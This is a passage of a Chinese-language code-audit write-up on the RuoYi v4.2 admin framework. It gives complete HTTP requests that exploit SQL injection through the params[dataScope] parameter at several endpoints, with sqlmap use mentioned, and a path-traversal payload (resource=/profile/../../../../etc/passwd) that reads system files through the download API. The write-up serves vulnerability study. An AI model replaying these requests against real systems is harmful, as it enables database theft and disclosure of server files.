    Referer: http://127.0.0.1/system/dept
    Cookie: JSESSIONID=197e09c3-c430-457e-89dc-700649018614
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    deptName=&status=&params%5BdataScope%5D=*
注入点位置：src/main/resources/mapper/system/SysDeptMapper.xml文件第51行，且追溯流程和注入一类似，这里就不过多描述了，如下：
注意，这里我们来到了控制器，控制器里可以对照到URL路径/system/dept/list，接下来去查看SysDept中包含了哪些实体类，发现并没有dataScope
这里我们先去后台抓包，后台->部门管理->搜索按钮，抓包如下：
可以看到这里默认只有deptName=&status=这两个参数，并且在实体类中也并没有dataScope，所以这里我们自己构造一下，把他加上去：
直接丢SQLmap，如下：
#### 2.1.3、注入点三
注入点位置：src/main/resources/mapper/system/SysUserMapper.xml文件第83行。  
后台位置：用户管理->搜索按钮
    POST /system/user/list HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Content-Length: 175
    Origin: http://127.0.0.1
    DNT: 1
    Connection: close
    Referer: http://127.0.0.1/system/user
    Cookie: JSESSIONID=197e09c3-c430-457e-89dc-700649018614
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    deptId=&parentId=&loginName=&phonenumber=&status=&params%5BbeginTime%5D=&params%5BendTime%5D=&pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&params%5BdataScope%5D=*
#### 2.1.4、注入点四
注入点位置：src/main/resources/mapper/system/SysUserMapper.xml文件第100行。  
后台位置：角色管理->更多操作->分配用户
    POST /system/role/authUser/allocatedList HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Content-Length: 114
    Origin: http://127.0.0.1
    DNT: 1
    Connection: close
    Referer: http://127.0.0.1/system/role/authUser/1
    Cookie: JSESSIONID=197e09c3-c430-457e-89dc-700649018614
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&roleId=1&loginName=&phonenumber=&params%5BdataScope%5D=*
#### 2.1.5、注入点五
注入点位置：src/main/resources/mapper/system/SysUserMapper.xml文件第118行。  
后台位置：角色管理->更多操作->分配用户->添加用户这个数据包
    POST /system/role/authUser/unallocatedList HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Content-Length: 114
    Origin: http://127.0.0.1
    DNT: 1
    Connection: close
    Referer: http://127.0.0.1/system/role/authUser/selectUser/1
    Cookie: JSESSIONID=197e09c3-c430-457e-89dc-700649018614
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&roleId=1&loginName=&phonenumber=&params%5BdataScope%5D='
### 2.2、任意文件读取/下载漏洞代码审计
需要登陆
    GET /common/download/resource?resource=/profile/../1.txt HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Cookie: JSESSIONID=fa4b3bdd-e507-462a-a155-a2adf4842470;
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1
一般开发人员也都有比较好的习惯，对于注释方面写的也比较清楚。  
我拿到一个项目，习惯大致浏览下项目代码（主要看注释），梳理下功能。  
在本项目中，发现存在一处下载功能。  
代码位于
RuoYi-v4.2\ruoyiadmin\src\main\java\com\ruoyi\web\controller\common\CommonController.java
第96行-第111行。通过注释一目了然该部分代码的作用。如下图所示：
    通过全局搜索关键字 resourceDownload ，发现并没有其他功能调用他。
既然这样，只能分析代码，自己构造请求了。  
①、首先，漏洞代码点位于第110行，使用了 FileUtils.writeBytes()
方法输出指定文件的byte数组，即将文件从服务器下载到本地。其中该函数中有两个参数，分别为 downloadPath 和
response.getOutputStream() 。  
getOutputStream() 方法用于返回Servlet引擎创建的字节输出流对象，Servlet程序可以按字节形式输出响应正文。  
②、 downloadPath 来自第103行，是由 localPath 和StringUtils.substringAfter(resource,
Constants.RESOURCE_PREFIX); 组成。  
StringUtils.substringAfter() 方法为取得指定字符串后的字符串。 resource是请求中接收参数的字段。
Constants.RESOURCE_PREFIX 为设置的常量 /profile ，主要作用为资源映射路径的前缀。  
③、 localPath 来自第101行注释为 本地资源路径 ，通过打个端点，我们可以看到localPath: D:/ruoyi/uploadPath
，是从src\main\resources\application.yml 配置文件中第12行文件路径中获取的。  
这里关于路径单独把代码拿出来再说一遍：
    // 本地资源路径
    String localPath = Global.getProfile();     //最终localPath = D:/ruoyi/uploadPath
    // 数据库资源地址
    String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);
    把上面这句拆开：
    Constants.RESOURCE_PREFIX //这个东西是写死了的，是常量/profile
    StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);    //StringUtils.substringAfter() 方法为取得指定字符串后的字符串； resource是请求中接收参数的字段。
    所以这句话的意思是：取得请求中resource后面传过来的常量/profile后面的字符串
    例子：
        比如请求是：http://127.0.0.1/?resource=/profile/a/b/c.jsp
    那经过“StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX)”处理后就变成了/a/b/c.jsp
    所以这里要下载的文件地址为downloadPath = localPath(D:/ruoyi/uploadPath) + “/?resource=/profile后面传入的字符串”
第③点如下图所示：
    ④、通过第96行，知道接口路径为 /common/download/resource ，仅接受GET请 求。
⑤、通过第97行， String resource 知道接收参数值的为 resource 。  
汇总下信息。首先应该知道，处理整个文件流程，是没有任何防护的。根据接口路径和接收参数字段组合为
/common/download/resource?resource= 。根据 StringUtils.substringAfter()
方法为取得指定字符串后的字符串，其中指定的字符串为 /profile 。也就是取得 /profile 之后的字符串。那么最终，漏洞Payload为
resource=/profile/../../../../etc/passwd
。具体几个 ../ 要看实际设置目录的深度。